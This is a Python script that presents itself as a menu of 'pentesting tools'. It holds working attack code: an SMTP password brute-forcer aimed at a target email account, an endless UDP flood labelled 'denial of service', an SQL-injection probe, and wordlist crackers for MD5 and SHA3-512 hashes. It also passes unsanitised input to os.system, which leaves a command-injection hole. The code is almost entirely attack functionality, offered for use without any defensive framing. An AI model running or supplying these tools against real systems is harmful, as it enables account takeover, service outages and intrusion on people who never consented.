import sys
import urllib
import urllib.request
import os
import smtplib
import time
import socket
import random
import threading
import hashlib

sys.ps1 = '\033[94m'

os.system('clear')

print(sys.ps1)

print('''
 ████████╗██████╗ ██████╗ ██████╗ 
╚══██╔══╝██╔══██╗╚════██╗╚════██╗
   ██║   ██████╔╝ █████╔╝ █████╔╝
   ██║   ██╔══██╗ ╚═══██╗ ╚═══██╗
   ██║   ██║  ██║██████╔╝██████╔╝
   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═════╝ 
                                 
                    pentesting tools by v1
''')

print('''


[1] domainscanner
[2] email bruteforce
[3] denial of service
[4] port scanner
[5] sql injection scanner
[6] MD5 Hash Cracker
[7] Sha3_513 hash cracker
[8] exit

''')
l = int(input("select option : "))

def domainscan():
    lol = input('Enter the domain ya wanna scan: ')
    os.system('whois '+lol)
    os.system('dig '+lol)
    
    
def bruteforce():
    prot = input("Enter the protocol : ")
    port = int(input("Enter the port : "))
    
    smtpserver = smtplib.SMTP(prot, port)
    smtpserver.ehlo()
    smtpserver.starttls()
    print("made by V1 MoDzZz")
    user = input("Enter the targets email address: ")
    
    
    pwfile = input("what is your password file directory: ")
    pwfile = open(pwfile, "r")
    
    print("Checking all passowrds in the list please hold on it will take some time depends on password list and password")
    for password in pwfile:
        try:
            smtpserver.login(user, password)
            print("so the password is ", password)
            break;
        except smtplib.SMTPAuthenticationError:
            print(password, "is not the password")
    

def dos():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    ip1 = input("Enter The Hostname of target : ")
    port1 = int(input("Enter the Port : "))
    size1 = int(input("Enter Packet size : "))
    s1 = int(size1)
    print("===================================================================")
    print(" ")
    print("Attacking Target %s : %s with packet size %s"%(ip1,port1,s1)) 
    print(" ")
    print("===================================================================")
    while True:
        sock.sendto(bytes, (ip1,port1))
        
        
def pscanner():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)

    target = input("Enter The IP: ")
    port = int(input("Enter the port you wanna scan: "))
    def scan(port):
        if s.connect_ex((target, port)):
            print(port, "port is closed")
        else:
            print(port, " port is open")
    scan(port)
    
def sqli():
    url = input("Enter your url with ID paramenters : ")
    if (url == "help"):
        print('''

            for example:
          http://example.com/index.php?id=1

               ''')
        sys.exit()
    else:
        req = urllib.request.urlopen(url + "\'")
        b10 = req.read()
        fb100 = b10.decode('utf-8')
        if "You have an error in your SQL syntax" in fb100:
            print(url, " is vulnerable")
        else:
            print(url, " is not vulnerable")

def md5():
    haha = 0
    passlist = input("Enter the directory of your wordlist : ")
    phash = input("enter ur hash : ")
    try:
        file = open (passlist, "r")
    except:
        print("error: file not valid please make sure you enter correct directory")
        sys.exit()
    print("bruteforcing please wait... it gonna take some time depends on password")
    for pws in file:
        encoword = pws.encode('utf-8')
        dig = hashlib.md5(encoword.strip()).hexdigest()
        if (dig == phash):
            print("")
            print("")
            print("")
            print(pws, " is the password")
            haha = 1
            break
    if (haha == 0):
        print("")
        print("")
        print("")
        print("passphrase not found")
            
def sha3_512():
    haha = 0
    passlist = input("Enter the directory of your wordlist : ")
    phash = input("enter ur hash : ")
    try:
        file = open (passlist, "r")
    except:
        print("error: file not valid please make sure you enter correct directory")
        sys.exit()
    print("bruteforcing please wait... it gonna take some time depends on password")
    for pws in file:
        encoword = pws.encode('utf-8')
        dig = hashlib.sha3_512(encoword.strip()).hexdigest()
        if (dig == phash):
            print("")
            print("")
            print("")
            print(pws, " is the password")
            haha = 1
            break
    if (haha == 0):
        print("")
        print("")
        print("")
        print("passphrase not found")
        
    
if (l == 1):
    domainscan()
elif (l == 2):
    bruteforce()
elif (l == 3):
    dos()
elif (l == 4):
    pscanner()
elif (l == 5):
    sqli()
elif (l == 6):
    md5()
elif (l == 7):
    sha3_512()
elif (l == 8):
    sys.exit()
    
else:
    print("invalid option")
             
